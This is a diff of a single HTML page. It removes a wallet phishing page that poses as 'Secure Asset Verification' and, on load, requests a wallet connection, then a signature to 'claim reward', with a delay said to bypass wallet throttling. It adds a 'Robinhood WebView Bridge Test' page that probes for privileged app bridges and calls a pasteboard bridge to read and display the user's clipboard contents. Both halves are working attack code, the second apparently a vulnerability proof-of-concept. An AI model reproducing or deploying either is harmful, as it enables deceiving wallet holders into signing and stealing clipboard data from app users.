@@ -2,104 +2,93 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Secure Asset Verification</title>
+  <title>Robinhood WebView Bridge Test</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #0f172a;
-      color: white;
-      text-align: center;
-      padding: 40px;
+      background: #000;
+      color: #0f0;
+      font-family: monospace;
+      padding: 20px;
     }
-    button {
-      padding: 12px 20px;
-      margin: 10px;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      font-size: 16px;
-    }
-    #connect { background: #22c55e; }
-    #sign { background: #3b82f6; }
-    #log {
-      margin-top: 20px;
-      text-align: left;
-      background: #020617;
-      padding: 15px;
-      border-radius: 8px;
-      max-width: 600px;
-      margin-left: auto;
-      margin-right: auto;
-      font-size: 13px;
-      height: 200px;
-      overflow-y: auto;
+    .ok { color: #0f0; }
+    .warn { color: orange; }
+    .bad { color: red; }
+    .box {
+      border: 1px solid #0f0;
+      padding: 10px;
+      margin-top: 10px;
     }
   </style>
 </head>
 <body>
 
-<h2>🔐 Verifying Wallet Security...</h2>
-<p>Please wait while we verify your wallet.</p>
-
-<button id="connect" onclick="connectWallet()">Connect Wallet</button>
-<button id="sign" onclick="signMessage()">Sign Verification</button>
-
-<div id="log"></div>
+<h1>[+] Robinhood Bridge Test</h1>
+<div id="results">Running checks...</div>
 
 <script>
-  const logBox = document.getElementById("log");
+function log(msg, cls="ok") {
+  const el = document.createElement("div");
+  el.className = cls;
+  el.innerText = msg;
+  document.getElementById("results").appendChild(el);
+}
 
-  function log(msg) {
-    const p = document.createElement("div");
-    p.innerText = "> " + msg;
-    logBox.appendChild(p);
-    logBox.scrollTop = logBox.scrollHeight;
-    console.log(msg);
-  }
+function testBridges() {
+  let found = false;
 
-  async function connectAndThenSign() {
-    if (!window.ethereum) {
-      log("No wallet provider found.");
-      return;
-    }
+  // Microgram bridge
+  if (window._microgramEntryPoint) {
+    log("[CRITICAL] _microgramEntryPoint FOUND", "bad");
+    found = true;
 
     try {
-      log("Requesting wallet connection...");
-
-      const accounts = await window.ethereum.request({
-        method: 'eth_requestAccounts'
-      });
-
-      const account = accounts[0];
-      log("Connected: " + account);
-
-      // Wait a bit AFTER user approves connection
-      setTimeout(async () => {
+      const channel = new MessageChannel();
+      channel.port1.onmessage = (event) => {
         try {
-          log("Triggering signature after connection...");
+          const res = JSON.parse(event.data);
+          log("[+] Clipboard access response:", "warn");
 
-          await window.ethereum.request({
-            method: 'personal_sign',
-            params: [
-              "Security verification required to claim reward.",
-              account
-            ]
-          });
-
-          log("Signature request sent.");
-        } catch (err) {
-          log("Signature rejected or blocked.");
+          const box = document.createElement("div");
+          box.className = "box";
+          box.innerText = res.payload;
+          document.body.appendChild(box);
+        } catch(e) {
+          log("[-] Failed parsing response", "warn");
         }
-      }, 1500); // delay helps bypass wallet UI throttling
+      };
 
-    } catch (err) {
-      log("Connection rejected.");
+      window._microgramEntryPoint.postMessage(JSON.stringify({
+        target: "mg.ui.pasteboard#implementation",
+        messageId: "test",
+        payload: "{}",
+        wantsReply: true,
+        isReply: false
+      }), [channel.port2]);
+
+    } catch (e) {
+      log("[-] Bridge call failed: " + e.message, "warn");
     }
   }
 
-  window.addEventListener("load", () => {
-    setTimeout(connectAndThenSign, 1000);
-  });
+  // Generic Android bridge
+  if (window.android || window.Android) {
+    log("[HIGH] Android JS interface detected", "warn");
+    found = true;
+  }
+
+  // Sprig / UserLeap check
+  if (window.sprig || window.userleap) {
+    log("[HIGH] Sprig/UserLeap bridge detected", "warn");
+    found = true;
+  }
+
+  if (!found) {
+    log("[SAFE] No privileged bridge detected", "ok");
+  }
+}
+
+// Delay slightly to allow bridge injection
+setTimeout(testBridges, 1000);
 </script>
 
 </body>
